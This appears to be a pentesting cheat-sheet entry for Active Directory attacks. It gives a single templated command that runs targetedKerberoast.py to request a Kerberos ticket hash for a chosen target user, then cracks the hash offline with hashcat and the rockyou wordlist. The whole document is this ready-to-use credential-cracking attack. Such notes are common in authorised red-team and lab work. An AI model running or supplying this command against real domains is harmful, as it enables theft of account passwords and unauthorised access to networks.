# targetedkerberoast
#target/remote #os/linux #cat/ad

## Targeted kerberoast
```
targetedKerberoast.py -d <domain> -u '<user>' <auth> --request-user <target_user> | grep krb5tgs > <target_user>.hash; hashcat <target_user>.hash /usr/share/wordlists/rockyou.txt --force
```
